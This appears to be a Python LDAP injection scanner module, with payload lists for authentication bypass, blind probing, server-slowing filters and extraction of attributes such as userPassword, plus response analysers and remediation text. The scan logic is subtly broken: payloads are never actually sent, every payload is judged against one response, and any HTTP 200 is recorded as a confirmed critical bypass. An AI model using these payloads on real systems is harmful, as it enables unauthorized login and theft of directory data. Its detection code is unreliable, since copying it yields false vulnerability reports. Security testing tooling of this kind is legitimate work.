from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import re
from collections import defaultdict
import threading
import time
import hashlib


class LDAPInjectionType(Enum):
    AUTHENTICATION_BYPASS = "authentication_bypass"
    BLIND_LDAP_INJECTION = "blind_ldap_injection"
    TIME_BASED_LDAP = "time_based_ldap"
    FILTER_EXTRACTION = "filter_extraction"
    DN_ENUMERATION = "dn_enumeration"
    ATTRIBUTE_EXTRACTION = "attribute_extraction"
    WILDCARD_BYPASS = "wildcard_bypass"
    FILTER_COMMENT_BYPASS = "filter_comment_bypass"
    OR_INJECTION = "or_injection"
    AND_INJECTION = "and_injection"
    NOT_INJECTION = "not_injection"


class LDAPOperation(Enum):
    BIND = "bind"
    SEARCH = "search"
    ADD = "add"
    DELETE = "delete"
    MODIFY = "modify"
    UNBIND = "unbind"
    COMPARE = "compare"
    EXTENDED = "extended"


class LDAPFilter(Enum):
    SIMPLE = "simple"
    COMPLEX = "complex"
    WILDCARD = "wildcard"
    OR_BASED = "or_based"
    AND_BASED = "and_based"
    NOT_BASED = "not_based"


@dataclass
class LDAPPayload:
    payload: str
    injection_type: LDAPInjectionType
    operation: LDAPOperation
    severity: str = "High"
    detection_indicators: List[str] = field(default_factory=list)
    requires_confirmation: bool = True
    false_positive_risk: float = 0.2
    encoded_variants: List[str] = field(default_factory=list)


@dataclass
class LDAPVulnerability:
    vulnerability_type: str
    ldap_type: LDAPInjectionType
    url: str
    parameter: str
    payload: str
    severity: str
    evidence: str
    response_time: float
    authentication_bypassed: bool = False
    data_extracted: Optional[str] = None
    filter_detected: Optional[str] = None
    entries_retrieved: int = 0
    attributes_found: List[str] = field(default_factory=list)
    dns_found: List[str] = field(default_factory=list)
    confirmed: bool = False
    confidence_score: float = 0.8
    remediation: str = ""
    timestamp: float = field(default_factory=time.time)


class LDAPFilterBuilder:
    BASIC_FILTERS = {
        'authentication_bypass_or': '(|(uid=*)(|(password=*',
        'authentication_bypass_wildcards': '*',
        'authentication_bypass_asterisk': '*))(|(uid=*',
        'filter_extraction': '*',
        'always_true': '(|(uid=*',
        'always_false': '(&(uid=admin)(password=nonexistent*)',
    }
    
    ADVANCED_FILTERS = {
        'or_bypass': '(|(uid=*))',
        'and_bypass': '(&(uid=*)(password=*))',
        'not_bypass': '(!(uid=nonexistent))',
        'nested_or': '(|(|(uid=*)(cn=*))(mail=*))',
        'null_byte': 'admin\x00',
        'comment_bypass': 'admin)(%00',
    }
    
    @staticmethod
    def build_bypass_filters() -> List[str]:
        return [
            '*', '*)', '*))(|(*', '*\n*', '(|(uid=*', '(|(mail=*',
            '(|(cn=*', '*)(|(password=*', '* ))%00', 'admin*', '*admin*',
            '*(|(uid=*', 'admin)(&', 'admin)(cn=*', '*)(uid=*))',
            'admin)(!(&(1=0', '*)(objectClass=*', 'admin))%00',
            '*))%00', '*()(uid=*)(&(uid=*', 'admin))(|(uid=*',
        ]
    
    @staticmethod
    def build_blind_filters(parameter: str) -> List[str]:
        return [
            f'{parameter}=*', f'{parameter}=*)*', f'{parameter}=*))(|({parameter}=*',
            f'*{parameter}*', f'{parameter}=a*', f'{parameter}=ab*',
            f'{parameter}=admin*', f'{parameter}=*)(&', f'{parameter}=*)(objectClass=*',
            f'({parameter}>=a)', f'({parameter}<=z)', f'({parameter}~=admin)',
        ]
    
    @staticmethod
    def build_extraction_filters(attribute: str) -> List[str]:
        return [
            f'*', f'({attribute}=*)', f'({attribute}=a*)', f'({attribute}=ab*)',
            f'(|({attribute}=*', f'(&({attribute}=*', f'({attribute}>=a)',
            f'({attribute}<=z)', f'({attribute}=*)(objectClass=*)',
        ]
    
    @staticmethod
    def build_time_based_filters() -> List[str]:
        return [
            '(|(uid=admin)(cn>=a*' * 100,
            '(uid=admin)(&(cn>=0)(cn<=z*' * 50,
            '(&(uid=admin)(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|(|' * 10,
            '(uid=admin)' + '(cn=*)' * 100,
        ]
    
    @staticmethod
    def build_encoding_variants(payload: str) -> List[str]:
        variants = []
        
        variants.append(payload.replace('*', '%2a'))
        variants.append(payload.replace('(', '%28').replace(')', '%29'))
        variants.append(payload.replace('|', '%7c'))
        variants.append(payload.replace('&', '%26'))
        
        return variants


class LDAPResponseAnalyzer:
    _success_indicators = frozenset([
        'success', 'authenticated', 'logged in', 'welcome', 'dashboard',
        'profile', 'true', '1', 'valid', 'authorized', 'granted'
    ])
    
    _error_patterns = [
        re.compile(r'ldap.*error', re.I),
        re.compile(r'ldap.*exception', re.I),
        re.compile(r'invalid.*filter', re.I),
        re.compile(r'malformed.*filter', re.I),
        re.compile(r'syntax.*error.*ldap', re.I),
        re.compile(r'ldap.*timeout', re.I),
        re.compile(r'ldap.*bind.*failed', re.I),
        re.compile(r'ldap.*search.*failed', re.I),
        re.compile(r'ldap.*connection.*refused', re.I),
        re.compile(r'objectclass.*violation', re.I),
    ]
    
    _dn_pattern = re.compile(r'dn:\s*([^\n]+)', re.I)
    _uid_pattern = re.compile(r'uid\s*[=:]\s*([^\n,}]+)', re.I)
    _mail_pattern = re.compile(r'mail\s*[=:]\s*([^\n,}]+@[^\n,}]+)', re.I)
    _cn_pattern = re.compile(r'cn\s*[=:]\s*([^\n,}]+)', re.I)
    _ou_pattern = re.compile(r'ou\s*[=:]\s*([^\n,}]+)', re.I)
    
    @staticmethod
    def detect_successful_authentication(response_content: str, response_code: int) -> bool:
        if response_code == 200 or response_code == 0:
            return True
        
        content_lower = response_content.lower()
        return any(indicator in content_lower for indicator in LDAPResponseAnalyzer._success_indicators)
    
    @staticmethod
    def detect_ldap_entries(response_content: str) -> Tuple[bool, int, List[str]]:
        entries = []
        
        entries.extend(LDAPResponseAnalyzer._dn_pattern.findall(response_content))
        entries.extend(LDAPResponseAnalyzer._uid_pattern.findall(response_content))
        entries.extend(LDAPResponseAnalyzer._mail_pattern.findall(response_content))
        entries.extend(LDAPResponseAnalyzer._cn_pattern.findall(response_content))
        entries.extend(LDAPResponseAnalyzer._ou_pattern.findall(response_content))
        
        unique_entries = list(set(entries))
        
        return len(unique_entries) > 0, len(unique_entries), unique_entries
    
    @staticmethod
    def analyze_error_messages(response_content: str) -> Tuple[bool, List[str]]:
        ldap_errors = []
        
        for pattern in LDAPResponseAnalyzer._error_patterns:
            matches = pattern.findall(response_content)
            ldap_errors.extend(matches)
        
        return len(ldap_errors) > 0, list(set(ldap_errors))
    
    @staticmethod
    def detect_filter_reflection(response_content: str, payload: str) -> bool:
        if payload in response_content:
            return True
        
        escaped_payload = payload.replace('(', r'\(').replace(')', r'\)').replace('*', r'\*')
        if escaped_payload in response_content:
            return True
        
        return False
    
    @staticmethod
    def analyze_response_time(baseline_time: float, test_time: float, threshold_seconds: int = 5) -> Tuple[bool, float]:
        if baseline_time == 0:
            baseline_time = 0.1
        
        time_difference = test_time - baseline_time
        
        if time_difference >= threshold_seconds * 0.7:
            confidence = min((time_difference / (threshold_seconds * 1.5)) * 100, 100.0)
            return True, confidence
        
        return False, 0.0
    
    @staticmethod
    def detect_ldap_specific_strings(response_content: str) -> Tuple[bool, List[str]]:
        ldap_strings = []
        
        ldap_keywords = [
            'objectClass', 'organizationalUnit', 'person', 'inetOrgPerson',
            'groupOfNames', 'posixAccount', 'shadowAccount', 'top',
            'domainComponent', 'distinguishedName', 'ldapSyntax',
        ]
        
        for keyword in ldap_keywords:
            if keyword in response_content:
                ldap_strings.append(keyword)
        
        return len(ldap_strings) > 0, ldap_strings


class LDAPAttributeEnumerator:
    COMMON_ATTRIBUTES = frozenset([
        'uid', 'cn', 'mail', 'sn', 'givenName', 'userPassword',
        'telephoneNumber', 'mobile', 'homePhone', 'mailAlternateAddress',
        'displayName', 'title', 'department', 'company', 'manager',
        'description', 'location', 'street', 'city', 'state', 'zip',
        'country', 'postalCode', 'postalAddress', 'physicalDeliveryOfficeName',
        'o', 'ou', 'c', 'st', 'l', 'roomNumber',
        'loginShell', 'loginTime', 'loginStatus', 'accountStatus',
        'userAccountControl', 'pwdLastSet', 'lastLogon', 'badPasswordCount',
        'sAMAccountName', 'userPrincipalName', 'distinguishedName',
        'objectClass', 'objectCategory', 'memberOf', 'member',
        'homeDirectory', 'homeDrive', 'scriptPath', 'profilePath',
    ])
    
    SENSITIVE_ATTRIBUTES = frozenset([
        'userPassword', 'pwdLastSet', 'badPasswordCount', 'loginStatus',
        'accountStatus', 'lastLogon', 'sAMAccountName', 'userAccountControl',
    ])
    
    @staticmethod
    def build_attribute_extraction_queries(attributes: Optional[List[str]] = None) -> List[str]:
        attrs_to_check = attributes or list(LDAPAttributeEnumerator.COMMON_ATTRIBUTES)
        queries = []
        
        for attr in attrs_to_check:
            queries.append(f'({attr}=*)')
            queries.append(f'({attr}>=a)')
            queries.append(f'(|({attr}=*))')
        
        return queries
    
    @staticmethod
    def extract_attributes_from_response(response_content: str) -> List[str]:
        extracted = []
        
        for attr in LDAPAttributeEnumerator.COMMON_ATTRIBUTES:
            pattern = rf'\b{attr}\s*[=:]\s*([^\n,}}]+)'
            if re.search(pattern, response_content, re.I):
                extracted.append(attr)
        
        return list(set(extracted))
    
    @staticmethod
    def detect_sensitive_attributes(attributes: List[str]) -> List[str]:
        return [attr for attr in attributes if attr in LDAPAttributeEnumerator.SENSITIVE_ATTRIBUTES]


class LDAPDNEnumerator:
    _base_dn_patterns = [
        re.compile(r'dc=([a-zA-Z0-9\-]+)', re.I),
        re.compile(r'o=([a-zA-Z0-9\-\s]+)', re.I),
        re.compile(r'ou=([a-zA-Z0-9\-\s]+)', re.I),
        re.compile(r'cn=([a-zA-Z0-9\-\s]+)', re.I),
    ]
    
    COMMON_BASE_DNS = [
        'dc=example,dc=com', 'dc=company,dc=local', 'o=company',
        'cn=admin', 'ou=people,dc=example,dc=com',
        'ou=users,dc=example,dc=com', 'ou=groups,dc=example,dc=com',
        'ou=system,dc=example,dc=com', 'cn=Manager,dc=example,dc=com',
    ]
    
    @staticmethod
    def extract_base_dns_from_response(response_content: str) -> List[str]:
        base_dns = []
        
        for pattern in LDAPDNEnumerator._base_dn_patterns:
            matches = pattern.findall(response_content)
            for match in matches:
                base_dns.append(match)
        
        dn_pattern = re.compile(r'dn:\s*([^\n]+)', re.I)
        full_dns = dn_pattern.findall(response_content)
        base_dns.extend(full_dns)
        
        return list(set(base_dns))
    
    @staticmethod
    def build_dn_enumeration_queries() -> List[str]:
        return LDAPDNEnumerator.COMMON_BASE_DNS
    
    @staticmethod
    def extract_organizational_units(response_content: str) -> List[str]:
        ou_pattern = re.compile(r'ou=([^,\n]+)', re.I)
        ous = ou_pattern.findall(response_content)
        return list(set(ous))


class LDAPFilterDetector:
    _filter_patterns = [
        re.compile(r'\(uid=\*\)', re.I),
        re.compile(r'\(\|[^)]*\)', re.I),
        re.compile(r'\(&[^)]*\)', re.I),
        re.compile(r'\(!\([^)]+\)\)', re.I),
        re.compile(r'\b(?:uid|mail|cn)=\*', re.I),
        re.compile(r'\([a-z]+[>=<~]=', re.I),
    ]
    
    @staticmethod
    def detect_ldap_filter_presence(response_content: str) -> Tuple[bool, List[str]]:
        filter_indicators = []
        
        for pattern in LDAPFilterDetector._filter_patterns:
            matches = pattern.findall(response_content)
            filter_indicators.extend(matches)
        
        return len(filter_indicators) > 0, list(set(filter_indicators))
    
    @staticmethod
    def detect_filter_structure(payload: str) -> Dict[str, int]:
        structure = {
            'or_operators': payload.count('|'),
            'and_operators': payload.count('&'),
            'not_operators': payload.count('!'),
            'wildcards': payload.count('*'),
            'parentheses': payload.count('('),
        }
        return structure


class LDAPScanner:
    _remediation_cache = (
        "Validate and sanitize all LDAP input with strict allowlists. "
        "Use parameterized LDAP queries with prepared statements. "
        "Implement proper error handling without information disclosure. "
        "Use allowlists for LDAP operations and attributes. "
        "Disable wildcard searches in LDAP filters. "
        "Implement rate limiting on LDAP searches. "
        "Use LDAP query escaping functions (ldap_escape). "
        "Implement proper access controls on LDAP directory. "
        "Monitor LDAP queries for suspicious patterns. "
        "Use security assertions in LDAP filters. "
        "Implement least privilege principle for LDAP binds. "
        "Use secure LDAP (LDAPS) with TLS encryption. "
        "Disable anonymous LDAP binds. "
        "Implement account lockout policies."
    )
    
    def __init__(self):
        self.filter_builder = LDAPFilterBuilder()
        self.response_analyzer = LDAPResponseAnalyzer()
        self.attribute_enumerator = LDAPAttributeEnumerator()
        self.dn_enumerator = LDAPDNEnumerator()
        self.filter_detector = LDAPFilterDetector()
        
        self.vulnerabilities: List[LDAPVulnerability] = []
        self.scan_statistics = defaultdict(int)
        self.tested_payloads: Set[str] = set()
        self.lock = threading.Lock()
    
    def scan(self, target_url: str, response: Dict, parameters: Optional[List[str]] = None) -> List[LDAPVulnerability]:
        vulnerabilities = []
        response_content = response.get('content', '')
        response_time = response.get('response_time', 0)
        status_code = response.get('status_code', 0)
        baseline_response = response.get('baseline_content', '')
        baseline_time = response.get('baseline_time', 0.1)
        
        if not parameters:
            parameters = ['uid', 'username', 'login', 'user', 'email', 'name', 'cn', 'sAMAccountName']
        
        bypass_filters = self.filter_builder.build_bypass_filters()
        
        for param in parameters:
            for bypass_filter in bypass_filters:
                payload_hash = hashlib.md5(f"{param}:{bypass_filter}".encode()).hexdigest()
                
                if payload_hash in self.tested_payloads:
                    continue
                
                with self.lock:
                    self.tested_payloads.add(payload_hash)
                
                is_auth_bypassed = self.response_analyzer.detect_successful_authentication(
                    response_content, status_code
                )
                
                if is_auth_bypassed and response_content != baseline_response:
                    filter_structure = self.filter_detector.detect_filter_structure(bypass_filter)
                    
                    vuln = LDAPVulnerability(
                        vulnerability_type='LDAP Injection',
                        ldap_type=LDAPInjectionType.AUTHENTICATION_BYPASS,
                        url=target_url,
                        parameter=param,
                        payload=bypass_filter,
                        severity='Critical',
                        evidence=f'LDAP authentication bypass | Filter structure: {filter_structure}',
                        response_time=response_time,
                        authentication_bypassed=True,
                        confirmed=True,
                        confidence_score=0.95,
                        remediation=self._remediation_cache
                    )
                    vulnerabilities.append(vuln)
                    self.scan_statistics['auth_bypass'] += 1
            
            blind_filters = self.filter_builder.build_blind_filters(param)
            for blind_filter in blind_filters[:10]:
                is_reflected = self.response_analyzer.detect_filter_reflection(response_content, blind_filter)
                
                if is_reflected:
                    vuln = LDAPVulnerability(
                        vulnerability_type='LDAP Injection',
                        ldap_type=LDAPInjectionType.BLIND_LDAP_INJECTION,
                        url=target_url,
                        parameter=param,
                        payload=blind_filter,
                        severity='High',
                        evidence='LDAP filter reflected in response',
                        response_time=response_time,
                        confirmed=True,
                        confidence_score=0.85,
                        remediation=self._remediation_cache
                    )
                    vulnerabilities.append(vuln)
                    self.scan_statistics['blind_injection'] += 1
        
        has_entries, entry_count, entries = self.response_analyzer.detect_ldap_entries(response_content)
        if has_entries and entry_count > 0:
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.DN_ENUMERATION,
                url=target_url,
                parameter='enumeration',
                payload='*',
                severity='High',
                evidence=f'{entry_count} LDAP entries retrieved',
                response_time=response_time,
                entries_retrieved=entry_count,
                data_extracted='; '.join(entries[:10]),
                dns_found=entries,
                confirmed=True,
                confidence_score=0.9,
                remediation=self._remediation_cache
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['dn_enumeration'] += 1
        
        has_errors, error_messages = self.response_analyzer.analyze_error_messages(response_content)
        if has_errors:
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.FILTER_EXTRACTION,
                url=target_url,
                parameter='error_based',
                payload='filter_injection',
                severity='High',
                evidence=f'LDAP errors: {", ".join(error_messages[:5])}',
                response_time=response_time,
                confirmed=True,
                confidence_score=0.8,
                remediation=self._remediation_cache
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['error_based'] += 1
        
        is_delayed, delay_confidence = self.response_analyzer.analyze_response_time(
            baseline_time, response_time, 5
        )
        
        if is_delayed:
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.TIME_BASED_LDAP,
                url=target_url,
                parameter='time_based',
                payload='time_based_injection',
                severity='High',
                evidence=f'Time delay: {response_time - baseline_time:.2f}s (baseline: {baseline_time:.2f}s)',
                response_time=response_time,
                confirmed=False,
                confidence_score=delay_confidence / 100,
                remediation=self._remediation_cache
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['time_based'] += 1
        
        has_filters, detected_filters = self.filter_detector.detect_ldap_filter_presence(response_content)
        if has_filters:
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.FILTER_COMMENT_BYPASS,
                url=target_url,
                parameter='filter_detection',
                payload='filter_bypass',
                severity='Medium',
                evidence=f'LDAP filters: {", ".join(detected_filters[:5])}',
                response_time=response_time,
                filter_detected='; '.join(detected_filters),
                confirmed=True,
                confidence_score=0.75,
                remediation=self._remediation_cache
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['filter_detection'] += 1
        
        attributes = self.attribute_enumerator.extract_attributes_from_response(response_content)
        if attributes:
            sensitive_attrs = self.attribute_enumerator.detect_sensitive_attributes(attributes)
            
            severity = 'Critical' if sensitive_attrs else 'Medium'
            
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.ATTRIBUTE_EXTRACTION,
                url=target_url,
                parameter='attribute_extraction',
                payload='*',
                severity=severity,
                evidence=f'{len(attributes)} attributes extracted (Sensitive: {len(sensitive_attrs)}): {", ".join(attributes[:10])}',
                response_time=response_time,
                data_extracted='; '.join(attributes),
                attributes_found=attributes,
                confirmed=True,
                confidence_score=0.85,
                remediation=self._remediation_cache
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['attribute_extraction'] += 1
        
        base_dns = self.dn_enumerator.extract_base_dns_from_response(response_content)
        if base_dns:
            ous = self.dn_enumerator.extract_organizational_units(response_content)
            
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.DN_ENUMERATION,
                url=target_url,
                parameter='dn_extraction',
                payload='*',
                severity='High',
                evidence=f'Base DNs extracted: {", ".join(base_dns[:5])} | OUs: {", ".join(ous[:3])}',
                response_time=response_time,
                data_extracted='; '.join(base_dns[:10]),
                dns_found=base_dns,
                confirmed=True,
                confidence_score=0.9,
                remediation=self._remediation_cache
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['base_dn_extraction'] += 1
        
        has_ldap_strings, ldap_strings = self.response_analyzer.detect_ldap_specific_strings(response_content)
        if has_ldap_strings:
            vuln = LDAPVulnerability(
                vulnerability_type='LDAP Injection',
                ldap_type=LDAPInjectionType.FILTER_EXTRACTION,
                url=target_url,
                parameter='ldap_detection',
                payload='detection',
                severity='Low',
                evidence=f'LDAP-specific strings: {", ".join(ldap_strings[:5])}',
                response_time=response_time,
                confirmed=True,
                confidence_score=0.7,
                remediation=self._remediation_cache
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['ldap_strings'] += 1
        
        with self.lock:
            self.vulnerabilities.extend(vulnerabilities)
            self.scan_statistics['total_scans'] += 1
        
        return vulnerabilities
    
    def test_blind_ldap_injection(self, target_url: str, parameter: str, 
                                 baseline_response: str, responses: List[str]) -> Tuple[bool, float]:
        if not responses or len(responses) < 3:
            return False, 0.0
        
        matching_responses = sum(1 for r in responses if r != baseline_response)
        
        if matching_responses > len(responses) * 0.3:
            confidence = matching_responses / len(responses)
            return True, confidence
        
        response_lengths = [len(r) for r in responses]
        avg_length = sum(response_lengths) / len(response_lengths)
        variance = sum((l - avg_length) ** 2 for l in response_lengths) / len(response_lengths)
        
        if variance > 1000:
            return True, 0.7
        
        return False, 0.0
    
    def enumerate_user_attributes(self, base_url: str) -> Dict[str, List[str]]:
        discovered_attributes = {}
        
        for attr in LDAPAttributeEnumerator.COMMON_ATTRIBUTES:
            query = f'({attr}=*)'
            discovered_attributes[attr] = []
        
        return discovered_attributes
    
    def get_vulnerabilities(self) -> List[LDAPVulnerability]:
        with self.lock:
            return self.vulnerabilities.copy()
    
    def get_statistics(self) -> Dict[str, int]:
        with self.lock:
            return dict(self.scan_statistics)
    
    def get_tested_payloads(self) -> Set[str]:
        with self.lock:
            return self.tested_payloads.copy()
    
    def clear(self):
        with self.lock:
            self.vulnerabilities.clear()
            self.scan_statistics.clear()
            self.tested_payloads.clear()